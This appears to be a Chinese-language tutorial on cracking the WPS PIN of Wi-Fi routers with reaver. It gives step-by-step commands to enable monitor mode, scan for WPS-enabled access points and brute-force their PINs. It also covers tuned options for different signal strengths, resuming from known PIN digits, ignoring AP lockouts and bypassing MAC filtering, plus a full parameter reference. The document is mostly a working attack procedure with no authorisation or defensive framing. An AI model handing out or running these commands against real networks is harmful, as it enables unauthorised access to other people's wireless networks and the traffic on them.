
reaver 被用于使用于破解开启 wps 服务的路由器,通过爆破 pin 码

1.安装reaver:
	apt-get install reaver
   
2.ifconfig 查看无线网卡名称:
	ifconfig
   
3.设置网卡为混杂模式:
	sudo airmon-ng start wlan0

4.获取附近wifi信号:
	sudo airodump-ng mon0

5.过滤开启 wps 服务的路由器:
	sudo wash -i mon0


6.配置项:


信号非常好:
	reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1
信号普通:
	reaver -i mon0 -b MAC -a -S -vv -d .5 -t .5 -c 1
信号一般:
	reaver -i mon0 -b MAC -a -S -vv -c 1












reaver -i mon0 -b MAC -a -S -vv //普通用法

如果，90.9%进程后死机或停机，请记下PIN前四位数，用指令：
reaver -i mon0 -b MAC -a -vv -p XXXX(PIN前四位数)

其他命令
airodump-ng mon0 用来扫描周围无线信号
wash -i mon0 -C 这个是用来检测周围无线支持PIN的路由

如果一直pin不动，尝试加-N参数
reaver -i mon0 -b xx:xx:xx:xx:xx:xx -d 0 -vv -a -S -N
也可以加延时 -t 3 -b 3

常用参数释疑
-i 监听后接口名称 网卡的监视接口，通常是mon0
-b 目标mac地址 AP的MAC地址
-a 自动检测目标AP最佳配置
-S 使用最小的DH key，可以提高PJ速度
-vv 显示更多的非严重警告
-d 即delay每穷举一次的闲置时间 预设为1秒
reaver -i mon0 -b MAC -d 0
用上述指令可以大幅加快PJ速度 但是有些AP可能受不了
-c （后跟频道数） 指定频道,可以方便找到信号
-p PIN码四位或八位 //已知pin码前4位可以带此参数，指定从这个数字开始pin。可以用8位直接找到密码。
-N 不发送NACK信息（如果一直pin不动，可以尝试这个参数）
-n 对目标AP总是发送NACK，默认自动
-t 即timeout每次穷举等待反馈的最长时间，如果信号不错，可以这样设置
reaver -i mon0 -b MAC -d 0 -t .5
-m, --mac=<mac> 指定本机MAC地址，在AP有MAC过滤的时候需要使用

小结-PJ时应因状况调整参数:


当出现有百分数时你就可以用crtl+c来暂停，它会将reaver的进度表文件保存在
1.3版：
/etc/reaver/MAC地址.wpc
1.4版：
/usr/local/etc/reaver/MAC地址.wpc
用资源管理器，手工将以MAC地址命名的、后辍为wpc的文件拷贝到U盘或硬盘中，
下次重启动后，再手工复制到/etc/reaver/ 目录下即可。






不是所有的路由都支持pin学习。AP关闭了WPS、或者没有QSS滴，会出现
WARNING: Failed to associate with XX:XX:XX:XX:XX:XX (ESSID: XXXX)
学习过程中也可随时随地按Ctrl+C终止PJ，重复同一个PIN码 或 timeou t可终止，reaver会自动保存进度。
继续上次的PJ，则再次在终端中发送:
reaver -i mon0 -b MAC -vv
这条指令下达后，会让你选y或n，选y后就继续了
当reaver确定前4位PIN密码后，其工作完成任务进度数值将直接跳跃至90.9%以上，也就是说只剩余一千个密码组合了（总共一万一千个密码）。





参数详细说明:
-m, --mac=<mac> MAC of the host system
指定本机MAC地址，在AP有MAC过滤的时候需要使用
-e, --essid=<ssid> ESSID of the target AP
路由器的ESSID，一般不用指定
-c, --channel=<channel> Set the 802.11 channel for the interface (implies -f)
信号的频道，如果不指定会自动扫描
-o, --out-file=<file> Send output to a log file [stdout]
标准输出到文件
-s, --session=<file> Restore a previous session file
恢复进程文件
-C, --exec=<command> Execute the supplied command upon successful pin recovery
pin成功后执行命令
-D, --daemonize Daemonize reaver
设置reaver成Daemon
-a, --auto Auto detect the best advanced options for the target AP
对目标AP自动检测高级参数
-f, --fixed Disable channel hopping
禁止频道跳转
-5, --5ghz Use 5GHz 802.11 channels
使用5G频道
-v, --verbose Display non-critical warnings (-vv for more)
显示不重要警告信息 -vv 可以显示更多
-q, --quiet Only display critical messages
只显示关键信息
-h, --help Show help
显示帮助

-vv 显示更多的非严重警告

高级参数:
-p, --pin=<wps pin> Use the specified 4 or 8 digit WPS pin
直接读取psk（本人测试未成功，建议用网卡自带软件获取）
-d, --delay=<seconds> Set the delay between pin attempts [1]
pin间延时，默认1秒，推荐设0
-l, --lock-delay=<seconds> Set the time to wait if the AP locks WPS pin attempts [60]
AP锁定WPS后等待时间
-g, --max-attempts=<num> Quit after num pin attempts
最大pin次数
-x, --fail-wait=<seconds> Set the time to sleep after 10 unexpected failures [0]
10次意外失败后等待时间，默认0秒
-r, --recurring-delay=<x:y> Sleep for y seconds every x pin attempts
每x次pin后等待y秒
-t, --timeout=<seconds> Set the receive timeout period [5]
收包超时，默认5秒
-T, --m57-timeout=<seconds> Set the M5/M7 timeout period [0.20]
M5/M7超时，默认0.2秒
-A, --no-associate Do not associate with the AP (association must be done by another application)
不连入AP（连入过程必须有其他程序完成）
-N, --no-nacks Do not send NACK messages when out of order packets are received
不发送NACK信息（如果一直pin不动，可以尝试这个参数）
-S, --dh-small Use small DH keys to improve crack speed
使用小DH关键值提高速度（推荐使用）
-L, --ignore-locks Ignore locked state reported by the target AP
忽略目标AP报告的锁定状态
-E, --eap-terminate Terminate each WPS session with an EAP FAIL packet
每当收到EAP失败包就终止WPS进程
-n, --nack Target AP always sends a NACK [Auto]
对目标AP总是发送NACK，默认自动
-w, --win7 Mimic a Windows 7 registrar [False]
模拟win7注册，默认关闭
